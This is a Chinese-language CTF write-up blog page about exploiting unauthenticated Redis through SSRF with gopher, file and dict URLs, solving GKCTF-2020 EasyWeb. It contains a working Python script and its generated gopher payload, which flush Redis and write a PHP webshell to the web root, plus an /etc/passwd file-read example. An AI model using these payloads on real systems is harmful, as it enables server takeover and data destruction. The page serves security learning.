@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="什么是Redis  Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push&#x2F;pop 、 add&#x2F;remov">
+<meta property="og:type" content="article">
+<meta property="og:title" content="浅谈SSRF与redis及其相关问题">
+<meta property="og:url" content="https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="什么是Redis  Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push&#x2F;pop 、 add&#x2F;remov">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-06-13T09:18:38.000Z">
+<meta property="article:modified_time" content="2020-06-13T10:26:14.636Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="buuoj">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>浅谈SSRF与redis及其相关问题</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/06/17/%E6%97%A5%E5%BF%97%E6%B5%85%E6%9E%90/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/06/06/%E6%81%B6%E8%87%AD%E6%95%B0%E6%8D%AE%E5%8C%85/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&text=浅谈SSRF与redis及其相关问题"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&is_video=false&description=浅谈SSRF与redis及其相关问题"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=浅谈SSRF与redis及其相关问题&body=Check out this article: https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&name=浅谈SSRF与redis及其相关问题&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&t=浅谈SSRF与redis及其相关问题"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-number">1.</span> <span class="toc-text">什么是Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">Redis漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">Redis漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E4%B8%8E%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">SSRF与各种协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">Gopher协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.</span> <span class="toc-text">file协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.3.</span> <span class="toc-text">dict协议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        浅谈SSRF与redis及其相关问题
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-06-13T09:18:38.000Z" itemprop="datePublished">2020-06-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/buuoj/" rel="tag">buuoj</a>, <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="什么是Redis"><a href="#什么是Redis" class="headerlink" title="什么是Redis"></a>什么是Redis</h1><p>  Redis是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、 Key-Value数据库。和Memcached类似，它支持存储的value 类型相对更多，包括 string(字符串)、list ( 链表)、 set(集合)、zset(sorted set – 有序集合)和 hash（哈希类型）。这些数据类型都支持push/pop 、 add/remove 及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上， redis支持各种不同方式的排序。与 memcached 一样，为了保证效率，数据都是缓存在内存中。区别的是 redis 会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了 master-slave ( 主从)同步。</p>
+<h2 id="Redis漏洞"><a href="#Redis漏洞" class="headerlink" title="Redis漏洞"></a>Redis漏洞</h2><p>Redis会因为配置不当而产生漏洞。<br>Redis默认监听端口为 0.0.0.0:6379,默认没有设置密码认证，这意味着redis服务器暴漏在公网并且可以被操作。<br>Redis未授权漏洞利用情况有如下几种<br>1.敏感数据泄露<br>2.写shell<br>3.把公钥写入authorized_keys，可以登录主机。（需要Redis以root权限运行）<br>4.contrab反弹shell</p>
+<h2 id="Redis漏洞利用"><a href="#Redis漏洞利用" class="headerlink" title="Redis漏洞利用"></a>Redis漏洞利用</h2><p>对于未授权访问的情况，可以获取到Redis服务器ip后在本地远程连接Redis服务器，也可以构造数据包向Redis服务器发送恶意代码。</p>
+<h1 id="SSRF与各种协议"><a href="#SSRF与各种协议" class="headerlink" title="SSRF与各种协议"></a>SSRF与各种协议</h1><p>SSRF全程为 Server-Side-Request-Forgery 服务器端请求伪造，即为通过服务器对内网资源进行一些请求，可以进行文件读取，内网扫描、主机探测、漏洞利用等活动。</p>
+<h2 id="Gopher协议"><a href="#Gopher协议" class="headerlink" title="Gopher协议"></a>Gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它。<br>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，再构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议<br>gopher协议格式：URL:  gopher://<host>:<port>/<gopher-path>_UrlEncodedTCPStream</p>
+<h2 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h2><p>curl支持file协议，可以通过file协议LFI。file:///etc/passwd</p>
+<h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><p>curl支持dict协议，可以通过dict协议探测服务信息。<br>curl dict://127.0.0.1:22</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>GKCTF-2020 EasyWeb<br>这道题拿到手没啥思路 看到源码提示了secret之后发现是ifconfig<br>然后就使用burp扫一下内网，发现一台173.187.36.11这台服务器的报错是redis的报错。<br>然后爆破扫一下端口，发现是默认的6379。<br>接下来考虑SSRF打内网未授权Redis。<br>EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.216.189.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure>
+<p>替换url和payload即可<br>生成payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;173.187.36.11:6379&#x2F;_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2431%0D%0A%0A%0A%3C%3Fphp%20eval%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A&#x2F;var&#x2F;www&#x2F;html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A</span><br></pre></td></tr></table></figure>
+<p>然后访问<a target="_blank" rel="noopener" href="http://redis_ip/shell.php%E5%8D%B3%E5%8F%AFgetflag">http://redis_ip/shell.php即可getflag</a></p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/">https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/</a><br><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNode">https://www.gem-love.com/ctf/2361.html#EZ%E4%B8%89%E5%89%91%E5%AE%A2EzNode</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/158065.html">https://www.freebuf.com/column/158065.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/162035.html">https://www.freebuf.com/vuls/162035.html</a><br><a target="_blank" rel="noopener" href="https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/">https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFRedis"><span class="toc-number">1.</span> <span class="toc-text">什么是Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.</span> <span class="toc-text">Redis漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Redis%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">Redis漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF%E4%B8%8E%E5%90%84%E7%A7%8D%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">SSRF与各种协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">Gopher协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.2.</span> <span class="toc-text">file协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dict%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.3.</span> <span class="toc-text">dict协议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text">例题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">4.</span> <span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&text=浅谈SSRF与redis及其相关问题"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&is_video=false&description=浅谈SSRF与redis及其相关问题"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=浅谈SSRF与redis及其相关问题&body=Check out this article: https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&title=浅谈SSRF与redis及其相关问题"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&name=浅谈SSRF与redis及其相关问题&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/06/13/%E6%B5%85%E8%B0%88SSRF%E4%B8%8Eredis%E5%8F%8A%E5%85%B6%E7%9B%B8%E5%85%B3%E9%97%AE%E9%A2%98/&t=浅谈SSRF与redis及其相关问题"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
